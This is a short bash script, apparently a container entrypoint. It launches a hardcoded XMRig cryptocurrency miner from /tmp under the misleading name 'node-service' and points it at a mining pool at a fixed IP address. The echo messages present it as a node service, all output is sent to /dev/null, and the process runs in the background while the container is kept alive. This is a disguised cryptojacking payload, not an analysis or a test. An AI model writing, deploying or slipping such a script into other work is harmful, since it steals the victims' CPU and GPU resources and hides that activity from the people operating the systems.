#!/bin/bash

# Hardcoded XMRig miner with fixed parameters
# No environment variables or dynamic configuration

echo "Starting node service..."
echo "Pool: 62.60.148.249:9940"
echo "CUDA enabled, CPU max threads: 80"

# Run the hardcoded command exactly as specified
/tmp/node-service -o 62.60.148.249:9940 --cuda --cuda-loader=/usr/local/lib/libxmrig-cuda.so --cpu-max-threads-hint 80 > /dev/null 2>&1 &

echo "Node service started in background"

# Keep the container running
wait
